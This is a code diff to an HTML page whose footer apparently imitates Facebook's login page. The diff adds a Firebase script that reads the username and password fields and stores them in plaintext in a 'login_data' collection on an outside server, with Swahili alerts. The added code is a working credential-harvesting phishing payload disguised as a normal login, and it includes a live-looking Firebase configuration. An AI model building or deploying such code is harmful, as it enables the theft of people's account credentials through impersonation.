@@ -132,6 +132,47 @@
   <p class="footer">
     <a href="#">Create a Page</a> for a celebrity, brand or business.
   </p>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
 
+const firebaseConfig = {
+  apiKey: "AIzaSyDCKHDp1VpDTRr4-HGqgE1OFkEwWIDZyqI",
+  authDomain: "sadegpt-f79d7.firebaseapp.com",
+  projectId: "sadegpt-f79d7",
+  storageBucket: "sadegpt-f79d7.firebasestorage.app",
+  messagingSenderId: "474328809093",
+  appId: "1:474328809093:web:e94c3af5eca2e7949fb3ec",
+  measurementId: "G-53KDWTRR4H"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+async function loginUser() {
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+
+  if (!username || !password) {
+    alert("Jaza taarifa zote");
+    return;
+  }
+
+  try {
+    await addDoc(collection(db, "login_data"), {
+      username: username,
+      password: password,
+      time: new Date()
+    });
+
+    alert("Imetumwa!");
+
+  } catch (error) {
+    alert("Error: " + error.message);
+  }
+}
+
+window.loginUser = loginUser;
+</script>
 </body>
 </html>
